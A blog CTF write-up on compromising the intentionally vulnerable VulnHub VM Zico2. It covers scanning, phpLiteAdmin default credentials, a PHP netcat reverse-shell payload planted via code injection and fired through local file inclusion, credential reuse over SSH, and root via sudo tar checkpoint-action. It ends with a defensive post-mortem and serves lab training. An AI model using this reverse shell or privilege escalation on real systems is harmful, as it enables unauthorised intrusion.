[Main Page](../index.html) \| [Blog](https://github.com/berzerk0/GitPage/wiki/Post-Listing) \| [CTF Writeups](../CTF-Writeups/CTF-index.html) \| [How-To Guides](../How-To-Guides/HowTo-index.html) <br>


# CTF Writeup:
# Zico on VulnHub

<br>
![a0-logo](https://i.imgur.com/8DXYHCH.png)
<br>

## 12 March 2017

Get the VM here: [https://www.vulnhub.com/entry/zico2-1,210/](https://www.vulnhub.com/entry/zico2-1,210/)

## Introduction

My friends and I like to solve CTFs on our own, then teach each other how we solved it. This way, we get experience
both teaching and learning, and you always understand material you need to explain to someone else better than if you kept it to yourself.

Zico's author rates the box as "intermediate," but I'd call it "beginner plus."
The ideas needed to root the box are not complicated, but you need to have a bit
of prior knowledge to know that you need to implement them.

Shall we begin?

## 1. Initial Scanning

Since we are dealing with a VulnHub VM, we need to set it up on our __HOST ONLY__<br>
network. This box is intentionally vulnerable, why hook it up to your real network?

 Depending on how you've set up your host-only network, you may need to use `nmap` to determine the machine's IP.

  `nmap -sn 192.168.56.0/24`

![a1](https://i.imgur.com/09Mc9aI.png)

Once you've found the box, it's time to give it a real portscan. <br>
I like to use my `benmap` script, which runs a few scans and generates<br>
a working directory for the CTF. You can [check it out on Github.](https://github.com/berzerk0/textfiles/blob/master/shell_scripts/benmap/benmap.sh)

<br>
![a2_1](https://i.imgur.com/u3VBiBy.png)
![a2_2](https://i.imgur.com/h6o50ri.png)
<br>


The `nmap -F` scan found some potential avenues of attack:
* SSH on port 22
* HTTP on port 80
* rpcbind on port 111


HTTP is my favorite place to start on CTF's, so we hit it with the<br> triple threat: `nikto`, `dirsearch` and `fimap`. <br>

  `nikto -h 192.168.56.101 -o nikto_result.txt`

<br>
![a3](https://i.imgur.com/pYaDsdQ.png)
<br>


Nikto tells us that Apache is a bit obsolete, but nothing else particularly interesting. <br>
Throw that on our "places to dig" list and let's use `dirsearch`.


  `dirsearch -u 'http://192.168.56.101' -e php,html,js,txt,sh --simple-report=dirsearch_quick`

<br>
![a4](https://i.imgur.com/a6MYBuh.png)
<br>

We find a  lot of interesting filenames, especially the `dbadmin` directory. <br>
Anything with *"admin"* in the title may be worth a look. <br>
Finally, we'll let fimap see if we can dig anywhere we aren't supposed to be able to. <br>

  `fimap -H -d 3 -u "http://192.168.56.101" -w /tmp/fimap_output | tee fimap_result`

<br>
![a5a](https://i.imgur.com/jmMbDqe.png)
<br>

  `http://hostname/view.php?page=tools.html` smells like file inclusion. <br>

The use of `?page=` may allow us to directly view arbitrary files on the webserver.
Instead of using `tools.html` as an argument, we just insert a file's full path.

 I tried something like `../../../../etc/passwd`, but didn't
find success. Maybe we can use this later.


Lastly, we peruse the site in the browser.

<br>
![a5](https://i.imgur.com/N9t0dNn.png)
<br>

*__Zico's Shop?__*

Zico doesn't seem confident that he is in control of his own site.<br>
Let's prove that he is right to have doubts and go right for that `/dbadmin` page.

<br>
![a6](https://i.imgur.com/1jLQmTA.png)
<br>

What have we here?

<br>
![a7](https://i.imgur.com/VezOmAh.png)
<br>


## 2. Doing Dirty Deeds in da Database

A php database page, with an obvious version number. The title of *"testdb"* hints at a default setup. <br>
A default setup may use a default password.

password: `admin`

<br>
![a8](https://i.imgur.com/OLPqnZD.png)
<br>

We're inside. <br>
Those look like password hashes to me. <br>
Our friend [Hashbuster](https://github.com/UltimateHackers/Hash-Buster) should have a look at them.

<br>
![a9](https://i.imgur.com/hWf3hXj.png)
<br>

Not too shabby! Root and user passwords. <br>
I don't think this db is actually used for anything other than testing, but there is a chance that the same passwords are used to login with SSH.

<br>
![a10](https://i.imgur.com/cA1dU1f.png)
<br>

Nope. <br>
We can see some other useful information on the database page, however.<br>

For one, we are given the *test_user* database's full file path.

<br>
![filepath](https://i.imgur.com/cIKFxWz.png)
<br>

This information, combined with the Local File Inclusion vulnerability we spotted earlier means we can access these databases by visiting a URL.

We can try some tricks using SQL commands, but I wonder if<br>
these waters have been charted before...

  `findsploit phpliteadmin`

<br>
![a11](https://i.imgur.com/UGy4CHR.png)
<br>

The very first hit matches our phpLiteAdmin version number. <br>

If you run  `searchsploit -x 24044`, you'll see a document explaining how the
exploit is operated. <br>
We'll break it down, step by step.

* Create a new database with a name ending in *".php"*
![a13](https://i.imgur.com/JdLyqJl.png)
<br>
<br>

* Select this new database and create a new table with one field.
![a14](https://i.imgur.com/sfGcXbM.png)
<br>
<br>
* Set the field to the "__Text__" type, and enter a php-command payload as the Default Value. <br>
I decided to use my most reliable netcat-based reverse-shell. <br> <br>
`<?php passthru("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc local.machine.ip.addr PORTNUM > /tmp/f"); ?>`


![a15](https://i.imgur.com/ageVsIt.png)
<br>


* Create the table, and set up the listener on your local machine.

`nc -lnvp PORTNUM`

<br>
![a16](https://i.imgur.com/Q1XQfzi.png)
<br>

* Visiting the database in the browser, using our handy-dandy LFI vulnerability will run the payload and pop our shell.

`http://192.168.56.101/view.php?page=../../../../usr/databases/a.php`

<br>
![a17](https://i.imgur.com/MSq2t1h.png)
<br>



## 3. From `www-data` to User

This shell could use some improvement, so let's see if we can't spawn a bash shell with a tty using python.

  `which python` <br>
  `which bash` <br>
  `python -c 'import pty;pty.spawn("/bin/bash")'`

<br>
![a18](https://i.imgur.com/fRMKgcG.png)
<br>

My "advanced" powers of deduction tell me that we are going to have a user named *zico*. A user with a home directory, even.

Let's verify.

  `ls -la /home` <br>
  `ls -la /home/zico` <br>

![a19](https://i.imgur.com/ZJ0EDTX.png)
<br>

Luckily for us, Zico doesn't seem to mind if we read files in his home directory.<br>
Talk about courteous!

Zico seems to have even left a note behind for himself.<br>
Surely he won't mind if we read that, too.

  `cd /home/zico` <br>
  `cat to_do.txt` <br>

![a20](https://i.imgur.com/pXIZR1p.png)
<br>

Zico seems to be trying out some content management systems for a new website. <br>
The site we got through in order to get this shell used phpliteadmin, so Wordpress must be next. <br>


We see Wordpress sites all the time in CTFs, and know it well enough to know where to look for the squishy bits.


  `cd wordpress` <br>
	`ls -l` <br>

![a21](https://i.imgur.com/jS0VDFA.png)
<br>

Zico hasn't implemented this site yet, so it may not have been combed through for sensitive info. <br>
`wp-config.php` can often contain passwords.


  `grep -i 'pass' wp-config.php`

<br>
![a22](https://i.imgur.com/iOGsxwh.png)
<br>

A database password, nice. <br>
Let's try it with SSH, because, why not?


![a23](https://i.imgur.com/7yFK8Fw.png)
<br>


## 4. From Zico to Root

As the presumed owner of this box, Zico should be able to get some significant things done. <br>


  `sudo -l`

![a24](https://i.imgur.com/1t6g9WA.png)
<br>

`tar` and `zip` are a bit strange to see as sudo-enabled commands. Can they be used for
code execution?

I searched online, and found some very interesting information at these [two](https://www.gnu.org/software/tar/manual/html_section/tar_29.html) [sites](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Tar%20commands%20execution).

`tar` can be run with flags that cause it to  unarchive with "checkpoints." <br>
At these points, the process will pause and take an action, then seamlessly resume. <br>

Since we can run `tar` as root, we just need to use these checkpoints to run some commands that escalate our privileges.

### Running Tar As Root For Fun and Profit

* Move to a "temporary" folder like `/dev/shm` and create a file that we will compress.

* Compress it with `tar` as Zico. No need to run as root just yet.

<br>
![a25](https://i.imgur.com/yb5Ghvd.png)
<br>

* Unarchive the newly created `.tar`, making sure to use `sudo` and including the flags to add a checkpoint and commands.

  The commands will run along with the `.tar` command, so any output from the commands will appear in the terminal

  Our test payload is the (redundant) command `echo $(id)`, which will output the info belonging to the user who ran the `tar` command to the terminal. <br> <br>
  If things go according to plan, we should see `root`'s info.

`	sudo tar -xf archive.tar --checkpoint=1 --checkpoint-action=exec='echo $(id)'
`

<br>
![a26](https://i.imgur.com/WnAb0Xt.png)
<br>

Our privesc concept is proven. <br>
We can just run `/bin/bash` as our checkpoint commands to spawn a root shell.

`sudo tar -xf archive.tar --checkpoint=1 --checkpoint-action=exec='/bin/bash'`

<br>
![a27](https://i.imgur.com/NSM6wGR.png)
<br>


And, we're root.

Go to the `/root` directory and grab the flag.

`cd /root` <br>
`ls` <br>
`cat flag.txt`

<br>
![a28](https://i.imgur.com/G3if37E.png)
<br>

## Post-Mortem

This CTF was made purposefully made porous, but these vulnerabilities can be found in the real world.

Here's what made Zico rootable.


__Use of Default/Obvious Credentials__
* In this scenario, Zico's phpLiteAdmin database was just for testing purposes. However, `admin` is simply not a password that should be in use. It's just too easy to guess.
* Had we not been able to gain access to the phpLiteAdmin panel, we may not have gotten any access at all.


__Local File Inclusion__
* Serving webpages with `?page=` is a recipe for local file inclusion.
* Only one page was intended to reached this way, and it wasn't even the only link to this page on the site.



__Outdated Versions of 3rd Party Software__
* The phpLiteAdmin version used here isn't even available for download from the phpLiteAdmin website.
* The code injection vulnerability we used to run our php payload was patched away in later versions.


__Credential Reuse__
* The password by `www-data` in the `wp-config.php` file to access the website database was the same as the user's password.


__Least Privilege Violations__
* `www-data` had unneccessary read access to `zico`'s home folder.
* If `zico` isn't a superuser, I'm not sure what reason they would need to have to run `tar` and `zip` as root.


<br>
## Thanks for reading!

<br>
[Main Page](../index.html) \| [Blog](https://github.com/berzerk0/GitPage/wiki/Post-Listing) \| [CTF Writeups](../CTF-Writeups/CTF-index.html) \| [How-To Guides](../How-To-Guides/HowTo-index.html) <br>
